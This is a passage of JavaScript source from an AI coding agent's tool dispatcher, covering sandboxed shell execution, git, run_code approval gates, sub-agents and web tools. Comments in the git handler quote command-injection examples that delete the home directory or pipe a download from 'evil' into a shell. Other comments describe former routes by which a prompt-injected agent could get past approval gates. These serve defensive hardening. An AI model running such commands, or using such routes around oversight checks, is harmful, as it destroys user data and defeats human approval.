          pinnedBackgroundBoundaries.some(
            (boundary) => boundary === "filesystem" || boundary === "network",
          );
        const linuxDirectPluginStrongBackground =
          backgroundPlatform === "linux" &&
          pluginBinInvocation !== null &&
          pluginBinSandboxExecutionContract !== null &&
          pinnedBackgroundBoundaries.some(
            (boundary) => boundary === "filesystem" || boundary === "network",
          );
        if (
          hasPinnedBackgroundPolicy &&
          (backgroundPlatform === "win32" ||
            (backgroundPlatform === "linux" &&
              !linuxGenericStrongBackground &&
              !linuxDirectPluginStrongBackground))
        ) {
          return attachDescriptor({
            error:
              "[Plugin bin] The current strong plugin boundary supports foreground execution only; background execution is fail-closed until Broker-owned process-tree teardown is available.",
            policy: {
              decision: "deny",
              via: "plugin-bin-pinned-sandbox-policy",
              reason: "background_execution_unsupported",
            },
            ...pluginBinResult,
            shellCommandPolicy: shellPolicy,
            approval: approvalOutcome,
          });
        }
        let linuxGenericBackgroundLaunch = null;
        if (linuxGenericStrongBackground) {
          const { workspaceRoot, workingDirectory } =
            resolveBackgroundShellWorkspacePaths(
              cwd,
              args.cwd,
              pluginBinSandboxPolicy,
            );
          const file = "/bin/sh";
          const launchArgs = ["-c", args.command];
          const options = {
            cwd: workingDirectory,
            shell: false,
            windowsHide: true,
            env: shellChildEnvironment,
            detached: false,
            origin: "tool:run_shell",
            policy: "allow",
            scope: "agent",
            sandboxPolicy: pluginBinSandboxPolicy,
            requirePersistentAudit: true,
            auditRedactCommand: true,
            auditRedactArgIndexes: [launchArgs.length - 1],
            auditContext: createShellProcessAuditContext(),
          };
          const issuer =
            _backgroundProcessDeps.issueLinuxWorkspaceSandboxExecutionContract;
          if (typeof issuer !== "function") {
            throw createBackgroundShellSandboxFailure(
              "background_contract_issuer_unavailable",
              "Linux background shell sandbox contract issuer is unavailable",
              pluginBinSandboxPolicy,
            );
          }
          let sandboxExecutionContract;
          try {
            sandboxExecutionContract = issuer(
              file,
              launchArgs,
              options,
              workspaceRoot,
              { sync: false },
            );
          } catch (error) {
            if (
              error?.sandboxFailClosed === true ||
              error?.code === "ERR_PROCESS_SANDBOX_BOUNDARY_UNSATISFIED"
            ) {
              throw error;
            }
            throw createBackgroundShellSandboxFailure(
              "background_contract_issuance_failed",
              `Linux background shell sandbox contract could not be issued: ${error?.message || String(error)}`,
              pluginBinSandboxPolicy,
              error,
            );
          }
          if (!sandboxExecutionContract) {
            throw createBackgroundShellSandboxFailure(
              "background_contract_unavailable",
              "Linux background shell sandbox contract issuer returned no authority",
              pluginBinSandboxPolicy,
            );
          }
          linuxGenericBackgroundLaunch = {
            file,
            args: launchArgs,
            options: {
              ...options,
              sandboxExecutionContract,
            },
          };
        }
        // Admission precedes task cleanup, sequence allocation, listener
        // registration, proxy startup and process creation.
        await admitShellDispatch();
        // Free memory from idle background tasks before adding another, so a
        // long agent run can't accumulate forgotten dev servers (no-op unless
        // the machine is actually under memory pressure).
        reapIdleBackgroundShellTasks();
        const id = `bg_${++_backgroundTaskSeq}`;
        const task = {
          id,
          command: args.command,
          cwd:
            linuxGenericBackgroundLaunch?.options.cwd ||
            (linuxDirectPluginStrongBackground
              ? executionPlugin.sandboxExecution.workingDirectory
              : args.cwd || cwd),
          status: "running",
          exitCode: null,
          signal: null,
          error: null,
          startedAt: new Date().toISOString(),
          lastActivityAt: Date.now(),
          endedAt: null,
          out: _newBgStream(),
          err: _newBgStream(),
          child: null,
          sandboxManagedTree:
            linuxGenericBackgroundLaunch !== null ||
            linuxDirectPluginStrongBackground,
        };
        try {
          // The strong route already has its exact contract-bound options.
          // Construct legacy options only for legacy/direct-Plugin launches.
          const bgSpawnOpts = linuxGenericBackgroundLaunch
            ? null
            : {
                cwd: task.cwd,
                shell: shellInv.useDefaultShell,
                windowsHide: true,
                // Same agent-identity env as the foreground path: CLAUDECODE marks
                // "running under the agent"; the session id correlates work to the
                // run (CC_SESSION_ID + CLAUDE_CODE_SESSION_ID for Claude-Code parity).
                // Credential proxy (opt-in, CC_CREDENTIAL_PROXY): keeps the agent's
                // real long-lived secrets out of the spawned command's env — a
                // no-op (same object) when disabled. See credential-proxy.js.
                env: shellChildEnvironment,
                // POSIX: own process group so check_shell{kill}/teardown can signal
                // the whole tree (shell + its grandchild command). No-op on Windows
                // where the tree is killed via taskkill /T instead.
                detached:
                  process.platform !== "win32" &&
                  !linuxDirectPluginStrongBackground,
              };
          // PowerShell route: explicit argv (shell:false above); default route
          // is the historical spawn(command, {shell:true}) byte-for-byte.
          const brokerOpts = bgSpawnOpts
            ? {
                ...bgSpawnOpts,
                origin: processOrigin,
                policy: "allow",
                scope: "agent",
                requirePersistentAudit: true,
                auditRedactCommand: true,
                auditRedactArgIndexes: shellProcessAuditRedactArgIndexes(),
                auditContext: createShellProcessAuditContext(),
                ...processProvenance,
              }
            : null;
          let child;
          if (linuxGenericBackgroundLaunch) {
            child = _backgroundProcessDeps.run(
              linuxGenericBackgroundLaunch.file,
              linuxGenericBackgroundLaunch.args,
              linuxGenericBackgroundLaunch.options,
            );
          } else if (pluginBinInvocation) {
            child = broker.spawn(
              executionPlugin.sandboxExecution?.kind ===
                "strict-plugin-node-bin"
                ? executionPlugin.sandboxExecution.runtimePath
                : executionPlugin.command,
              executionPlugin.argv,
              {
                ...brokerOpts,
                cwd:
                  executionPlugin.sandboxExecution?.workingDirectory ||
                  brokerOpts.cwd,
                shell: false,
              },
            );
          } else {
            child = shellInv.useDefaultShell
              ? broker.spawn(args.command, [], brokerOpts)
              : broker.spawn(shellInv.file, shellInv.argv, brokerOpts);
          }
          task.child = child;
          if (child.stdout) {
            child.stdout.setEncoding("utf8");
            child.stdout.on("data", (d) => {
              task.lastActivityAt = Date.now();
              _appendBgStream(task.out, d);
            });
          }
          if (child.stderr) {
            child.stderr.setEncoding("utf8");
            child.stderr.on("data", (d) => {
              task.lastActivityAt = Date.now();
              _appendBgStream(task.err, d);
            });
          }
          child.on("error", (err) => {
            task.status = "error";
            task.error = String(err?.message || err).substring(0, 2000);
            task.endedAt = new Date().toISOString();
            _releaseBgChildHandles(task);
          });
          // 'close' (not 'exit') so stdout/stderr are fully drained before the
          // status leaves "running" — otherwise a poll can observe completion
          // with the final output chunk not yet buffered.
          child.on("close", (code, signal) => {
            // 'error' may have already set a terminal state; don't overwrite it.
            if (task.status === "running") {
              task.status = code === 0 ? "exited" : "failed";
            }
            task.exitCode = code;
            task.signal = signal;
            task.endedAt = new Date().toISOString();
            _releaseBgChildHandles(task);
          });
        } catch (err) {
          if (
            linuxGenericBackgroundLaunch ||
            linuxDirectPluginStrongBackground
          ) {
            if (task.child && !task.child.killed) {
              try {
                task.child.kill("SIGKILL");
              } catch {
                // Preserve the setup failure; the bwrap supervisor also has
                // --die-with-parent as a final process-lifetime backstop.
              }
              _releaseBgChildHandles(task);
            }
            if (
              err?.sandboxFailClosed === true ||
              (typeof err?.code === "string" &&
                err.code.startsWith("ERR_PROCESS_SANDBOX"))
            ) {
              throw err;
            }
            throw createBackgroundShellSandboxFailure(
              "background_sandbox_launch_failed",
              `Linux background shell sandbox launch failed: ${err?.message || String(err)}`,
              pluginBinSandboxPolicy,
              err,
            );
          }
          task.status = "error";
          task.error = String(err?.message || err).substring(0, 2000);
          task.endedAt = new Date().toISOString();
        }
        _backgroundShellTasks.set(id, task);
        // Arm the process-exit net so a Ctrl-C / hard exit can't orphan this
        // task (the normal `finally` reaper is bypassed by signals).
        _ensureBgExitReaper();
        return attachDescriptor(
          {
            background: true,
            task_id: id,
            status: task.status,
            command: task.command,
            ...shellMeta,
            ...pluginBinResult,
            hint: "Poll output and completion with the check_shell tool using this task_id. Kill long-lived servers with check_shell { task_id, kill: true } when done.",
            shellCommandPolicy: shellPolicy,
            approval: approvalOutcome,
          },
          override || runtimeDescriptor,
        );
      }

      if (shellSandbox) {
        if (pluginBinSandboxPolicy) {
          return attachDescriptor(
            {
              error:
                "[Plugin bin] A strict plugin bin policy cannot be combined with the legacy ephemeral shell sandbox. Run without that sandbox so the ProcessExecutionBroker can enforce the pinned plugin boundary union.",
              policy: {
                decision: "deny",
                via: "plugin-bin-pinned-sandbox-policy",
                reason: "conflicting_sandbox_routes",
              },
              ...pluginBinResult,
              shellCommandPolicy: shellPolicy,
              approval: approvalOutcome,
            },
            override || runtimeDescriptor,
          );
        }
        await admitShellDispatch();
        const { executeSandboxedShell, sandboxSummary } =
          await import("../lib/agent-sandbox.js");
        // Domain-restricted networking is ENFORCED by routing the sandboxed
        // process's egress through a local filtering proxy (see
        // sandbox-egress-proxy.js). Start it only when the policy actually
        // restricts domains and network is on; tear it down after the command.
        const sboxPolicy = shellSandbox.policy || {};
        const needsEgress =
          shellSandbox.network === true &&
          (sboxPolicy.allowedDomains?.length || 0) +
            (sboxPolicy.deniedDomains?.length || 0) >
            0;
        let egressProxy = null;
        let proxyHandle = null;
        if (needsEgress) {
          try {
            const { createEgressProxy } =
              await import("../lib/sandbox-egress-proxy.js");
            proxyHandle = createEgressProxy(
              {
                allowedDomains: sboxPolicy.allowedDomains || [],
                deniedDomains: sboxPolicy.deniedDomains || [],
                allowPrivate: sboxPolicy.allowPrivate === true,
              },
              { bindHost: "0.0.0.0" }, // reachable from the container/netns
            );
            const listened = await proxyHandle.listen();
            egressProxy = { port: listened.port };
          } catch {
            // If the proxy can't start, leave egressProxy null so the sandbox
            // fails closed (refuses) rather than running without enforcement.
            proxyHandle = null;
            egressProxy = null;
          }
        }
        let result;
        try {
          // Proxy startup and dynamic imports are asynchronous. Re-read the
          // live authority once more after they settle and immediately before
          // the synchronous sandbox dispatch.
          await shellDispatchPolicyAuthority?.revalidate?.();
          refreshPluginExecutionAuthority();
          if (pluginBinSandboxPolicy) {
            const error = new Error(
              "A plugin sandbox authority appeared while the legacy shell sandbox was starting",
            );
            error.code = "ERR_PLUGIN_BIN_SANDBOX_ROUTE_CONFLICT";
            error.pluginBinFailClosed = true;
            throw error;
          }
          result = executeSandboxedShell(args.command, shellSandbox, {
            cwd: args.cwd || cwd,
            timeout: _resolveShellTimeout(args.timeout),
            maxBuffer: 1024 * 1024,
            egressProxy,
            env: sandboxChildEnvironment,
            auditContext: createShellProcessAuditContext(),
          });
        } finally {
          if (proxyHandle) {
            try {
              await proxyHandle.close();
            } catch {
              /* best-effort teardown */
            }
          }
        }
        const common = {
          sandbox: sandboxSummary(shellSandbox),
          shellCommandPolicy: shellPolicy,
          approval: approvalOutcome,
          policyTrace: ["shell-policy", "approval", "sandbox"],
        };
        if (result.exitCode !== 0) {
          return attachDescriptor(
            {
              error: (
                result.stderr ||
                `Sandbox command exited with code ${result.exitCode}`
              ).substring(0, 2000),
              stdout: result.stdout.substring(0, 30000),
              stderr: result.stderr.substring(0, 2000),
              exitCode: result.exitCode,
              ...common,
            },
            override || runtimeDescriptor,
          );
        }
        return attachDescriptor(
          { stdout: result.stdout.substring(0, 30000), ...common },
          override || runtimeDescriptor,
        );
      }

      try {
        const fgExecOpts = {
          cwd: args.cwd || cwd,
          encoding: "utf8",
          timeout: _resolveShellTimeout(args.timeout),
          maxBuffer: 1024 * 1024,
          // Agent-identity env for shell subprocesses (Claude-Code 2.1.132
          // parity): CLAUDECODE=1 marks "running under the agent"; CC_SESSION_ID
          // + its CLAUDE_CODE_SESSION_ID mirror let scripts/hooks correlate work
          // to the agent session (the mirror is what CC-targeting tools expect).
          // Credential proxy (opt-in, CC_CREDENTIAL_PROXY): keeps the agent's
          // real long-lived secrets out of the shell's env — a no-op (same
          // object) when disabled. See credential-proxy.js.
          env: shellChildEnvironment,
        };
        let output;
        await admitShellDispatch();
        const brokerExecOpts = {
          ...fgExecOpts,
          origin: processOrigin,
          policy: "allow",
          scope: "agent",
          requirePersistentAudit: true,
          auditRedactCommand: true,
          auditRedactArgIndexes: shellProcessAuditRedactArgIndexes(),
          auditContext: createShellProcessAuditContext(),
          ...processProvenance,
        };
        if (pluginBinInvocation && nonBlockingShell) {
          const res = await _runForegroundProcessAsync(
            executionPlugin.sandboxExecution?.kind === "strict-plugin-node-bin"
              ? executionPlugin.sandboxExecution.runtimePath
              : executionPlugin.command,
            executionPlugin.argv,
            {
              ...brokerExecOpts,
              cwd:
                executionPlugin.sandboxExecution?.workingDirectory ||
                brokerExecOpts.cwd,
              shell: false,
              windowsHide: true,
            },
          );
          output = res.stdout;
        } else if (pluginBinInvocation) {
          const res = broker.spawnSync(
            executionPlugin.sandboxExecution?.kind === "strict-plugin-node-bin"
              ? executionPlugin.sandboxExecution.runtimePath
              : executionPlugin.command,
            executionPlugin.argv,
            {
              ...brokerExecOpts,
              cwd:
                executionPlugin.sandboxExecution?.workingDirectory ||
                brokerExecOpts.cwd,
              shell: false,
              windowsHide: true,
            },
          );
          if (res.error) throw res.error;
          if (res.status !== 0) {
            const e = new Error(
              `Plugin bin failed (exit ${res.status}): ${pluginBinInvocation.binName}`,
            );
            e.status = res.status;
            e.stdout = res.stdout;
            e.stderr = res.stderr;
            throw e;
          }
          output = res.stdout ?? "";
        } else if (shellInv.useDefaultShell && nonBlockingShell) {
          const res = await _runForegroundProcessAsync(args.command, [], {
            ...brokerExecOpts,
            shell: true,
            windowsHide: true,
          });
          output = res.stdout;
        } else if (shellInv.useDefaultShell) {
          output = broker.execSync(args.command, brokerExecOpts);
        } else if (nonBlockingShell) {
          const res = await _runForegroundProcessAsync(
            shellInv.file,
            shellInv.argv,
            {
              ...brokerExecOpts,
              windowsHide: true,
            },
          );
          output = res.stdout;
        } else {
          // PowerShell route: explicit argv, no intermediate default shell.
          // Reproduce execSync's contract so the shared catch shapes errors
          // identically: throw on spawn error; throw an Error carrying
          // status/stdout/stderr on non-zero exit.
          const res = broker.spawnSync(shellInv.file, shellInv.argv, {
            ...brokerExecOpts,
            windowsHide: true,
          });
          if (res.error) throw res.error;
          if (res.status !== 0) {
            const e = new Error(
              `Command failed (${shellInv.kind}, exit ${res.status}): ${args.command}`,
            );
            e.status = res.status;
            e.stdout = res.stdout;
            e.stderr = res.stderr;
            throw e;
          }
          output = res.stdout ?? "";
        }
        // PR/session linking (gap-2026-07-11 P1#9): a successful `gh pr …`
        // (or `git push`) ties this session to the PR it touched. Async and
        // best-effort — never delays or fails the tool result.
        if (sessionId) {
          import("../lib/pr-link-ledger.js")
            .then((m) =>
              m.recordFromShellCommand({
                sessionId,
                command: args.command,
                output: String(output || ""),
                cwd: args.cwd || cwd,
              }),
            )
            .catch(() => {});
        }
        return attachDescriptor(
          {
            stdout: output.substring(0, 30000),
            ...shellMeta,
            ...pluginBinResult,
            shellCommandPolicy: shellPolicy,
            approval: approvalOutcome,
          },
          override || runtimeDescriptor,
        );
      } catch (err) {
        return attachDescriptor(
          {
            error: err.message.substring(0, 2000),
            // Surface stdout too: a failing command (test runner / linter /
            // build) usually prints WHAT failed to stdout and only the summary
            // to stderr, so dropping it on non-zero exit blinds the agent to the
            // actual failure. Only attach it when there IS output (a timeout with
            // no output keeps the field absent), mirroring the success path.
            ...(err.stdout
              ? { stdout: String(err.stdout).substring(0, 30000) }
              : {}),
            stderr: (err.stderr || "").substring(0, 2000),
            exitCode: err.status,
            ...(typeof err.code === "string" && err.code
              ? {
                  policy: {
                    decision: "deny",
                    via: "dispatch-revalidation",
                    code: err.code,
                  },
                }
              : {}),
            ...shellMeta,
            ...pluginBinResult,
            shellCommandPolicy: shellPolicy,
            approval: approvalOutcome,
          },
          override || runtimeDescriptor,
        );
      }
    }

    case "check_shell": {
      const taskId = args.task_id;
      // No task_id → list known background tasks (lightweight status surface).
      if (!taskId) {
        return attachDescriptor({
          tasks: listBackgroundShellTasks(),
        });
      }
      const task = _backgroundShellTasks.get(taskId);
      if (!task) {
        return attachDescriptor({
          error: `No background shell task with id "${taskId}".`,
          tasks: listBackgroundShellTasks(),
        });
      }
      let killed = false;
      if (args.kill === true) {
        // _killTask signals the whole process tree (see its doc); the close
        // handler flips status. Best-effort.
        killed = _killTask(task);
      }
      const out = _readBgStream(task.out);
      const err = _readBgStream(task.err);
      return attachDescriptor({
        task_id: task.id,
        status: task.status,
        running: task.status === "running",
        command: task.command,
        exitCode: task.exitCode,
        signal: task.signal,
        ...(task.error ? { error: task.error } : {}),
        stdout: out.text.substring(0, 30000),
        stderr: err.text.substring(0, 30000),
        ...(out.droppedGap ? { stdout_dropped_bytes: out.droppedGap } : {}),
        ...(err.droppedGap ? { stderr_dropped_bytes: err.droppedGap } : {}),
        ...(killed ? { killed: true } : {}),
        startedAt: task.startedAt,
        endedAt: task.endedAt,
      });
    }

    case "git": {
      const normalizedCommand = normalizeGitCommand(args.command);
      if (!normalizedCommand) {
        return attachDescriptor({
          error: "Git command is required.",
        });
      }

      // Run via argv (spawnSync, NO shell) so shell metacharacters in the
      // command — e.g. `status; rm -rf ~`, `log && curl evil|sh`, `$(…)` —
      // cannot inject a second command. Previously execSync(`git ${cmd}`) ran
      // the whole string through a shell, and the destructive-git/credential/
      // run_shell guards only inspect the first token, so this was an arbitrary
      // command-execution bypass for a prompt-injected agent. Quoted args (a
      // commit message) keep their content via the quote-aware tokenizer.
      const gitArgs = tokenizeShellWords(normalizedCommand);
      const res = _gitProcessDeps.run("git", gitArgs, {
        cwd: args.cwd || cwd,
        encoding: "utf8",
        timeout: 60000,
        maxBuffer: 1024 * 1024,
        windowsHide: true,
        origin: "agent-core:git-command",
        policy: "allow",
        scope: "agent-core",
      });
      const readOnly = isReadOnlyGitCommand(normalizedCommand);
      if (res.error) {
        return attachDescriptor({
          error: String(res.error.message || res.error).substring(0, 2000),
          command: normalizedCommand,
          readOnly,
        });
      }
      if (res.status !== 0) {
        const stderr = String(res.stderr || "").substring(0, 2000);
        return attachDescriptor({
          error: stderr || `git exited with code ${res.status}`,
          stderr,
          exitCode: res.status,
          command: normalizedCommand,
          readOnly,
        });
      }
      return attachDescriptor({
        stdout: String(res.stdout || "").substring(0, 30000),
        command: normalizedCommand,
        readOnly,
      });
    }

    case "run_code": {
      // run_code executes arbitrary python/node/bash — strictly more powerful
      // than run_shell — yet historically ran ungated. In an INTERACTIVE
      // session (interactiveApproval) it now honors the same ApprovalGate tier
      // as run_shell so a strict-tier session prompts before arbitrary code
      // runs (closing the bypass where `run_code` could `rm -rf` / rmtree past
      // the run_shell gate). A settings `allow` rule (ruleAllowed) pre-
      // authorizes; headless leaves interactiveApproval false so its existing
      // per-permission-mode behavior is unchanged.
      //
      // A spawned sub-agent gets a dedicated CONFIRMER-LESS ApprovalGate for a
      // strict/trusted mode (2026-07-13). It has no human to prompt, so gate
      // run_code under it too — decide() auto-denies CONFIRM via no-confirmer,
      // enforcing the tier on arbitrary code exactly like run_shell/browser_act
      // (which already gate whenever an approvalGate is present). This is the
      // child's gate specifically: the main headless + REPL gates ALWAYS carry a
      // confirmer, so `!hasConfirmer()` leaves them byte-identical.
      const policyGateNoConfirmer =
        approvalGate &&
        typeof approvalGate.hasConfirmer === "function" &&
        !approvalGate.hasConfirmer();
      // A durable remote-approval consumer is an explicit fail-closed mode.
      // run_code does not yet carry an exact lease tuple, so it must still
      // consult the remote confirmer in headless sessions; that confirmer
      // returns lease-unavailable and no code is persisted or launched.
      const durableAuthorizationGate =
        approvalGate &&
        typeof approvalGate.hasAuthorizationConsumer === "function" &&
        approvalGate.hasAuthorizationConsumer() === true;
      if (
        (interactiveApproval ||
          policyGateNoConfirmer ||
          durableAuthorizationGate) &&
        approvalGate &&
        !ruleAllowed &&
        typeof approvalGate.decide === "function"
      ) {
        const { APPROVAL_RISK, APPROVAL_DECISION } =
          await import("@chainlesschain/session-core");
        const gate = await approvalGate.decide({
          sessionId,
          riskLevel: APPROVAL_RISK.HIGH,
          tool: "run_code",
          args: runCodeApprovalDescriptor(args, cwd),
        });
        if (gate.decision !== APPROVAL_DECISION.ALLOW) {
          // Actionable denial (matches run_shell, Claude-Code 2.1.193): tell the
          // model retrying won't help and to involve the user.
          const tierLabel =
            typeof gate.policy === "string" ? `"${gate.policy}" ` : "";
          return attachDescriptor({
            error: `[ApprovalGate] run_code denied by the ${tierLabel}approval policy (via ${gate.via}). Retrying won't help — running arbitrary code needs user approval. Tell the user (they can approve it or relax the policy) and continue with other work.`,
            approval: {
              decision: gate.decision,
              via: gate.via,
              riskLevel: "high",
              policy: gate.policy,
            },
          });
        }
        if (gate.authorization) {
          return attachDescriptor({
            error:
              "[ApprovalGate] run_code received a durable authorization, but this tool does not yet implement an exact one-shot consume tuple. No code was launched.",
            approval: {
              decision: APPROVAL_DECISION.DENY,
              via: "authorization-consume-unsupported",
              riskLevel: "high",
              policy: gate.policy,
            },
            policy: {
              decision: "deny",
              via: "authorization-consume-unsupported",
              code: "CC_RUN_CODE_AUTHORIZATION_CONSUME_UNSUPPORTED",
            },
          });
        }
      }
      return attachDescriptor(await _executeRunCode(args, cwd));
    }

    case "spawn_sub_agent": {
      return attachDescriptor(
        await _executeSpawnSubAgent(args, {
          skillLoader,
          cwd,
          parentMessages,
          interaction,
          sessionId,
          llmOptions,
          workflowEffectId,
          workflowChildEffectId,
          workflowChildSequence,
          workflowEffectProtocol,
          subAgentDepth,
          subAgentBudget,
          sessionBudget,
          hostResourceBudget,
          subAgentContract,
          settingsHooks,
          // Immutable parent execution authority. The child may only tighten
          // these boundaries; it never reconstructs a fresh default policy.
          planManager,
          permissionRules,
          effectiveAllowedToolNames,
          hostManagedToolPolicy,
          sandbox,
          additionalDirectories,
          approvalGate,
          shellPolicyOverrides,
          classifyAllShell,
          unattendedActionPolicy,
          // Parent trace for the child's hook envelopes (parent_id).
          hookTraceId,
          // Parent MCP plumbing — a spawn can inherit these into the child,
          // filtered by the resolved contract's mcpServers allow-list.
          mcpClient,
          mcpHostClient,
          mcpCallLedger,
          mcpConflictScheduler,
          mcpDispatchAdmission,
          externalToolDescriptors,
          externalToolExecutors,
          extraToolDefinitions,
          // Parent memory — inherited into the child only when contract grants it.
          memoryDb,
          permanentMemory,
          signal,
          backgroundSubAgents,
          subAgentUsageSink,
          strictUsageTelemetry,
          onUsageBoundary,
          onUsageSettlement,
          onProviderReceipt,
          onToolCallBoundary,
          onToolCallSettlement,
          backgroundUsageFailureState,
          toolAdmission,
        }),
      );
    }

    case "web_fetch": {
      try {
        const { webFetch } = await import("../lib/web-fetch.js");
        let webFetchConfig = {};
        try {
          const { loadProjectConfig: _lpc, findProjectRoot: _fpr } =
            await import("../lib/project-detector.js");
          const projectRoot = _fpr(cwd);
          if (projectRoot) {
            const cfg = _lpc(projectRoot);
            webFetchConfig = cfg?.webFetch || {};
          }
        } catch (_err) {
          // Config optional — use defaults
        }
        const result = await webFetch(args.url, {
          format: args.format,
          maxBytes: args.maxBytes,
          timeout: args.timeout,
          config: webFetchConfig,
          hostResourceBudget,
        });
        return attachDescriptor(result);
      } catch (err) {
        return attachDescriptor({ error: `web_fetch failed: ${err.message}` });
      }
    }

    case "web_search": {
      try {
        const { webSearch } = await import("../lib/web-search.js");
        let webSearchConfig = {};
        try {
          const { loadProjectConfig: _lpc, findProjectRoot: _fpr } =
            await import("../lib/project-detector.js");
          const projectRoot = _fpr(cwd);
          if (projectRoot) {
            const cfg = _lpc(projectRoot);
            webSearchConfig = cfg?.webSearch || {};
          }
        } catch (_err) {
          // Config optional — use defaults (auto provider / keyless fallback)
        }
        const result = await webSearch(args.query, {
          provider: args.provider,
          maxResults: args.maxResults,
          timeout: args.timeout,
          config: webSearchConfig,
          hostResourceBudget,
        });
        return attachDescriptor(result);
      } catch (err) {
        return attachDescriptor({ error: `web_search failed: ${err.message}` });
      }
    }

    case "todo_write": {
      try {
        const { writeTodos } = await import("../lib/todo-manager.js");
        const result = writeTodos(sessionId, args.todos, {
          ...(Number.isSafeInteger(args.expected_revision)
            ? { expectedRevision: args.expected_revision }
            : {}),
        });
        if (!result.success) {
          return attachDescriptor({
            error: result.error,
            ...(result.code ? { code: result.code } : {}),
            ...(Number.isSafeInteger(result.expectedRevision)
              ? { expectedRevision: result.expectedRevision }
              : {}),
            ...(Number.isSafeInteger(result.actualRevision)
              ? { actualRevision: result.actualRevision }
              : {}),
            ...(result.recoveryStrategy
              ? { recoveryStrategy: result.recoveryStrategy }
              : {}),
          });
        }
        return attachDescriptor({
          success: true,
          count: result.count,
          summary: result.summary,
          revision: result.revision,
        });
      } catch (err) {
        return attachDescriptor({ error: `todo_write failed: ${err.message}` });
      }
    }

    case "slash_command": {
      try {
        const { getCommand, expandCommand, discoverCommands } =
          await import("../lib/slash-commands.js");
        const raw = String(args.command || "").trim();
        if (!raw) {
          return attachDescriptor({
            error: "slash_command requires a non-empty 'command'.",
          });
        }
        // Parse "/name arg1 arg2" exactly like a typed slash command (leading
        // '/' optional). First token is the command name, the rest are args.
        const [head, ...rest] = raw.replace(/^\//, "").split(/\s+/);
        const macro = head ? getCommand(head, cwd) : null;
        if (!macro) {
          const available = discoverCommands(cwd).map((c) => ({
            name: c.name,
            scope: c.scope,
            description: c.description || undefined,
          }));
          return attachDescriptor({
            error: `Unknown slash command "${head}".`,
            availableCommands: available,
            hint:
              available.length === 0
                ? "No user-defined slash commands found in .claude/commands/ or .chainlesschain/commands/."
                : "Call slash_command with one of availableCommands[].name.",
          });
        }
        // allowBang:false — the agent must not get an un-gated shell side
        // channel via a command file. $ARGUMENTS / @file (read) still expand;
        // any !`cmd` is left literal for the model to run via run_shell.
        const { prompt: expanded, warnings } = expandCommand(
          macro,
          rest.filter(Boolean),
          { cwd, allowBang: false },
        );
        return attachDescriptor({
          command: macro.name,
          scope: macro.scope,
          expandedPrompt: expanded,
          warnings: warnings && warnings.length ? warnings : undefined,
          instructions:
            "The expandedPrompt is the command's instructions. Carry them out " +
            "now using your normal tools.",
        });
      } catch (err) {
        return attachDescriptor({
          error: `slash_command failed: ${err.message}`,
        });
      }
    }

    case "ask_user_question": {
      if (!interaction || typeof interaction.askUser !== "function") {
        return attachDescriptor({
          error: "user_not_reachable",
          hint: "Non-interactive context (headless/gateway). Proceed autonomously using best judgement.",
        });
      }
      try {
        const answer = await interaction.askUser({
          question: args.question,
          options: Array.isArray(args.options) ? args.options : null,
          multiSelect: args.multiSelect === true,
          timeoutMs:
            typeof args.timeoutMs === "number" ? args.timeoutMs : 60000,
          defaultValue: args.defaultValue,
          onTimeout: args.onTimeout || "error",
          onReject: args.onReject || "error",
          sessionId,
          turnId,
          toolUseId: toolCallId,
        });
        return attachDescriptor({ answer });
      } catch (err) {
        const failureKind =
          err?.code === "USER_TIMEOUT"
            ? "timeout"
            : [
                  "USER_REJECTED",
                  "INTERACTION_REJECTED",
                  "INTERACTION_CANCELLED",
                ].includes(err?.code)
              ? "reject"
              : null;
        const strategy =
          failureKind === "timeout"
            ? args.onTimeout || "error"
            : failureKind === "reject"
              ? args.onReject || "error"
              : "error";
        if (failureKind && strategy === "useDefault") {
          if (!Object.prototype.hasOwnProperty.call(args, "defaultValue")) {
            return attachDescriptor({
              error: `${failureKind === "timeout" ? "user_timeout" : "user_rejected"}: useDefault requires defaultValue`,
            });
          }
          return attachDescriptor({
            answer: args.defaultValue,
            fallback: "default",
            reason: failureKind,
          });
        }
        if (failureKind && strategy === "skip") {
          return attachDescriptor({
            answer: null,
            skipped: true,
            reason: failureKind,
          });
        }
        if (failureKind === "timeout") {
          return attachDescriptor({
            error: "user_timeout",
            hint: "User did not respond in time. Proceed with best judgement.",
          });
        }
        if (failureKind === "reject") {
          return attachDescriptor({
            error: "user_rejected",
            hint: "The user declined this question. Do not assume consent.",
          });
        }
        return attachDescriptor({
          error: `ask_user_question failed: ${err.message}`,
        });
      }
    }

    case "search_sessions": {
      try {
        const { SessionSearchIndex } = await import("../lib/session-search.js");
        const { bootstrap } = await import("./bootstrap.js");
        const ctx = await bootstrap({ verbose: false });
        if (!ctx.db) {
          return attachDescriptor({
            error: "Database not available for session search",
          });
        }
        const index = new SessionSearchIndex(ctx.db);
        index.ensureTables();
        const results = index.search(args.query, {
          limit: args.limit || 10,
        });
        return attachDescriptor({
          query: args.query,
          results,
          count: results.length,
        });
      } catch (err) {
        return attachDescriptor({
          error: `Session search failed: ${err.message}`,
        });
      }
    }

    case "notify": {
      try {
        const { sendAgentNotification } =
          await import("../lib/agent-notify.js");
        const outcome = await sendAgentNotification({
          title: args.title,
          body: args.body,
          level: args.level,
        });
        return attachDescriptor(outcome);
      } catch (err) {
        return attachDescriptor({ error: `notify failed: ${err.message}` });
      }
    }

    case "schedule": {
      try {
        const { AgentScheduleStore } =
          await import("../lib/agent-schedule-store.js");
        const { parseDuration } = await import("../lib/loop.js");
        const store = new AgentScheduleStore();
        const action = String(args.action || "").toLowerCase();
        // Optional lifecycle knobs shared by all create actions: `expires` is a
        // duration after which an un-fired entry retires (never re-fires); `jitter`
        // is a per-entry spread so tasks sharing a cron minute fan out instead of
        // firing as a thundering herd.
        const expiresInMs = args.expires ? parseDuration(args.expires) : null;
        const jitterMs = args.jitter ? parseDuration(args.jitter) : 0;
        // Optional per-task execution policy for wakeup/cron: the scheduled run
        // can carry its OWN permission mode, worktree isolation and turn budget
        // instead of inheriting whatever ambient env `cc agenda run` runs in.
        // The store validates/drops each field; monitors ignore it.
        const runPolicy = {
          permissionMode: args.permission_mode || null,
          worktree: args.worktree === true,
          maxTurns: args.max_turns ?? null,
          goalCondition: args.goal_condition || null,
          maxOuterTurns: args.max_outer_turns ?? null,
          goalMaxTokens: args.goal_max_tokens ?? null,
          goalMaxCost: args.goal_max_cost ?? null,
          goalMaxTime: args.goal_max_time ?? null,
          // P1-8: action classes this unattended task may still perform (e.g.
          // "publish", "external_message"). Accepts an array or a comma list.
          unattendedAllowlist: Array.isArray(args.unattended_allow)
            ? args.unattended_allow
            : typeof args.unattended_allow === "string"
              ? args.unattended_allow
                  .split(",")
                  .map((s) => s.trim())
                  .filter(Boolean)
              : null,
        };
        if (action === "wakeup") {
          if (!args.prompt) {
